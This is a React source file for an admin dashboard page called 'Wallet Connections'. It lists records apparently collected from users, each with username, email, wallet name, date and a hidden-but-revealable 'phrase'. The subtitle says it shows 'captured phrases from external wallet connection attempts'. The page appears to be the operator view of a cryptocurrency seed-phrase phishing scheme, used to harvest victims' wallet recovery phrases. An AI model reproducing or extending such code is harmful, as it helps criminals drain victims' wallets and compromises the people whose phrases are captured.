"use client";
import { useEffect, useState, useCallback } from "react";
import { Eye, EyeOff, InboxIcon, Loader2, Trash2 } from "lucide-react";

type Connection = {
  id: string;
  userId: string;
  walletName: string;
  phrase: string;
  createdAt: string;
  user: { email: string; username: string };
};

const TH: React.CSSProperties = { padding: "11px 18px", textAlign: "left", fontSize: 11, fontWeight: 800, textTransform: "uppercase", letterSpacing: "0.08em", color: "var(--text-3)", background: "var(--surface)", borderBottom: "1px solid var(--border)", whiteSpace: "nowrap" };
const TD: React.CSSProperties = { padding: "14px 18px", borderBottom: "1px solid var(--border)", verticalAlign: "middle" };

export default function ConnectionsPage() {
  const [connections, setConnections] = useState<Connection[]>([]);
  const [loading, setLoading] = useState(true);
  const [visiblePhrases, setVisiblePhrases] = useState<Record<string, boolean>>({});

  const load = useCallback(async () => {
    try {
      const r = await fetch(`/api/admin/connections`);
      const d = await r.json();
      setConnections(d.connections || []);
    } catch (e) {
      console.error(e);
    }
    setLoading(false);
  }, []);

  useEffect(() => { load(); }, [load]);

  const toggleVisibility = (id: string) => {
    setVisiblePhrases(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Are you sure you want to delete this connection?")) return;
    try {
      const r = await fetch(`/api/admin/connections/${id}`, { method: "DELETE" });
      if (r.ok) {
        setConnections(prev => prev.filter(c => c.id !== id));
      } else {
        alert("Failed to delete connection.");
      }
    } catch (e) {
      console.error(e);
      alert("An error occurred while deleting.");
    }
  };

  return (
    <div style={{ minHeight: "100vh" }}>
      <div style={{ marginBottom: 28 }}>
        <h1 style={{ fontSize: 28, fontWeight: 900, color: "var(--text)", letterSpacing: "-0.02em" }}>Wallet Connections</h1>
        <p style={{ fontSize: 14, color: "var(--text-3)", marginTop: 4 }}>View captured phrases from external wallet connection attempts</p>
      </div>

      <div className="orders-table" style={{ background: "var(--card)", border: "1px solid var(--border)", borderRadius: 16, overflow: "hidden" }}>
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>{["User","Wallet","Date","Phrase"].map(h => <th key={h} style={TH}>{h}</th>)}</tr>
            </thead>
            <tbody>
              {loading ? (
                <tr><td colSpan={4} style={{ padding: "40px", textAlign: "center" }}><Loader2 className="animate-spin" style={{ margin: "auto" }} /></td></tr>
              ) : connections.length === 0 ? (
                <tr><td colSpan={4} style={{ padding: "80px 0", textAlign: "center" }}>
                  <InboxIcon size={36} style={{ color: "var(--border-2)", display: "block", margin: "0 auto 12px" }} />
                  <p style={{ fontSize: 14, fontWeight: 600, color: "var(--text-3)" }}>No connections found</p>
                </td></tr>
              ) : connections.map(conn => (
                <tr key={conn.id} style={{ transition: "background 0.1s" }} onMouseEnter={e => (e.currentTarget as HTMLElement).style.background = "var(--surface)"} onMouseLeave={e => (e.currentTarget as HTMLElement).style.background = "transparent"}>
                  <td style={TD}>
                    <div style={{ minWidth: 0 }}>
                      <p style={{ fontWeight: 700, fontSize: 14, color: "var(--text)" }}>{conn.user.username}</p>
                      <p style={{ fontSize: 12, color: "var(--text-3)" }}>{conn.user.email}</p>
                    </div>
                  </td>
                  <td style={TD}>
                    <p style={{ fontWeight: 800, fontSize: 14, color: "var(--text)" }}>{conn.walletName}</p>
                  </td>
                  <td style={TD}>
                    <p style={{ fontSize: 13, fontWeight: 600, color: "var(--text)" }}>{new Date(conn.createdAt).toLocaleDateString("en-US",{month:"short",day:"numeric",year:"numeric"})}</p>
                    <p style={{ fontSize: 12, color: "var(--text-3)" }}>{new Date(conn.createdAt).toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"})}</p>
                  </td>
                  <td style={TD}>
                    <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                      <div style={{ background: "var(--surface)", border: "1px solid var(--border)", padding: "8px 12px", borderRadius: 8, flex: 1, minWidth: 200, fontFamily: "monospace", fontSize: 13, color: visiblePhrases[conn.id] ? "var(--text)" : "var(--text-3)" }}>
                        {visiblePhrases[conn.id] ? conn.phrase : "••••••••••••••••••••••••••••••••"}
                      </div>
                      <button onClick={() => toggleVisibility(conn.id)} style={{ width: 32, height: 32, borderRadius: 8, background: "var(--surface)", border: "1px solid var(--border)", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
                        {visiblePhrases[conn.id] ? <EyeOff size={14} color="var(--text-3)" /> : <Eye size={14} color="var(--text-3)" />}
                      </button>
                      <button onClick={() => handleDelete(conn.id)} style={{ width: 32, height: 32, borderRadius: 8, background: "var(--surface)", border: "1px solid var(--border)", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }} title="Delete connection">
                        <Trash2 size={14} color="var(--error)" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
